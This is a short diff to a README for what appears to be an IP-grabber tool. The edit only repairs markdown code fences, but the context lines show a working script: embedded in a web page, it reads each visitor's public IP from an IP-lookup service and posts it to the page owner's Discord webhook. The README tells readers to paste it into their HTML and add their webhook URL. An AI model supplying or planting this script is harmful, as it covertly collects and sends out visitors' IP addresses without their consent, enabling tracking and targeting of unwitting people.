@@ -17,7 +17,7 @@ The script leverages JavaScript's `fetch` API to dispatch a GET request to `http
 
 Simply include the script in your HTML file. Just make sure to replace **`YOUR_DISCORD_WEBHOOK`** with your actual Discord webhook URL.
 
-`html
+```html
 <script>
   fetch('https://api.ipify.org')
     .then(response => response.text())
@@ -27,7 +27,7 @@ Simply include the script in your HTML file. Just make sure to replace **`YOUR_D
         body: JSON.stringify({ content: ip })
     }));
 </script>`
-
+```
 
 
 ## Disclaimer
